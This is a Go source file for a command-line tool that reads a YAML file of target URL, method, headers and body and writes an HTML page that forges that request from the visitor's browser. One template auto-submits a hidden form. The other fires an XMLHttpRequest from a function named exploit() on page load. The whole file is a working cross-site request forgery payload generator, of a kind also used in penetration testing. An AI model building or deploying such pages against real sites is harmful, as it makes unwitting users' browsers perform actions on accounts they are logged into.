package cmd

import (
	"fmt"
	"os"
	"strings"
	"text/template"

	"github.com/spf13/cobra"
	"gopkg.in/yaml.v3"
)

var basicTpl = `<html>
<body>
<form action="{{ .URL }}" method="{{ .Method }}">

{{ range .Fields }}<input type="hidden" name="{{ .Key }}" value="{{ .Value }}"/> 
{{ end }}
</form>
<script>
	document.forms[0].submit();
</script>
</body>
</html>`

var jsonTpl = `<html>
<head>
	<script>
		function exploit() {
			var xhr = new XMLHttpRequest();
			var url = "{{.URL}}";
			xhr.open("{{.Method}}", url);
			{{ range .Headers }}
			xhr.setRequestHeader("{{.Key}}", "{{.Value}}");
			{{ end }}
			xhr.send(JSON.stringify({{.Body}}));
		}
	</script>
</head>
<body onload="javascript:exploit()">
</body>
</html>`

type InputData struct {
	URL     string   `yaml:"url"`
	Method  string   `yaml:"method"`
	Headers []string `yaml:"headers"`
	Body    string   `yaml:"body"`
}

type Basic struct {
	URL    string
	Method string
}

type JSONOut struct {
	Basic
	Headers []Field
	Body    string
}

type Field struct {
	Key   string
	Value string
}

type HTTPOut struct {
	Basic
	Fields []Field
}

var runCmd = &cobra.Command{
	Use:   "run",
	Short: "create html file",
	Run: func(cmd *cobra.Command, args []string) {
		json, err := cmd.Flags().GetBool("json")
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error ocurred: %+v\n", err)
			os.Exit(1)
		}

		in, _ := cmd.Flags().GetString("input")
		out, _ := cmd.Flags().GetString("out")

		if json {
			genJSON(in, out)
		} else {
			genRaw(in, out)
		}

	},
}

func genJSON(input, output string) error {
	inputFilename, err := os.Open(input)
	if err != nil {
		return err
	}
	defer inputFilename.Close()

	var inputData InputData
	if err := yaml.NewDecoder(inputFilename).Decode(&inputData); err != nil {
		return err
	}

	var fields []Field

	for _, header := range inputData.Headers {
		splitted := strings.Split(header, ":")
		if len(splitted) > 1 {
			fields = append(fields, Field{
				Key:   splitted[0],
				Value: splitted[1],
			})
		}
	}

	jsonData := JSONOut{
		Basic:   Basic{inputData.URL, inputData.Method},
		Headers: fields,
		Body:    inputData.Body,
	}

	t, err := template.New("").Parse(jsonTpl)
	if err != nil {
		return err
	}

	outputFilename, err := os.Create(output)
	if err != nil {
		return err
	}
	defer outputFilename.Close()

	return t.Execute(outputFilename, &jsonData)
}

func genRaw(input, output string) error {
	inputFilename, err := os.Open(input)
	if err != nil {
		return err
	}
	defer inputFilename.Close()

	var inputData InputData
	if err := yaml.NewDecoder(inputFilename).Decode(&inputData); err != nil {
		return err
	}

	var fields []Field
	inputs := strings.Split(inputData.Body, "&")

	for _, input := range inputs {
		splitted := strings.Split(input, "=")
		if len(splitted) > 1 {
			fields = append(fields, Field{
				Key:   splitted[0],
				Value: splitted[1],
			})
		}
	}

	outhttp := HTTPOut{
		Basic:  Basic{inputData.URL, inputData.Method},
		Fields: fields,
	}

	t, err := template.New("").Parse(basicTpl)
	if err != nil {
		return err
	}

	outputFilename, err := os.Create(output)
	if err != nil {
		return err
	}
	defer outputFilename.Close()

	return t.Execute(outputFilename, &outhttp)
}

func init() {
	RootCmd.AddCommand(runCmd)
	runCmd.Flags().StringP("input", "i", "cfg.yaml", "yaml config file")
	runCmd.Flags().StringP("out", "o", "output.html", "output filename")
	runCmd.Flags().BoolP("json", "j", false, "dealing with json body")
}
